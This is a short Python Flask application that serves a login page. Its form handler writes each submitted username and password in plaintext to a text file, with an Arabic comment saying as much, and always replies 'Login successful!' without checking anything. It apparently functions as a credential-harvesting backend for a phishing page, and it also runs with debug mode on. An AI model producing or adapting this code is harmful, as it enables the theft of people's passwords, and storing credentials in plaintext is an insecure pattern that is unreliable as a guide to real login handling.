from flask import Flask, render_template, request

app = Flask(__name__, template_folder='templates')

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/process_login', methods=['POST'])
def process_login():
    username = request.form['username']
    password = request.form['password']
    
    # حفظ بيانات تسجيل الدخول في ملف نصي
    with open('login_data.txt', 'a') as file:
        file.write(f'Username: {username}\nPassword: {password}\n\n')
    
    return 'Login successful!'

if __name__ == '__main__':
    app.run(debug=True)
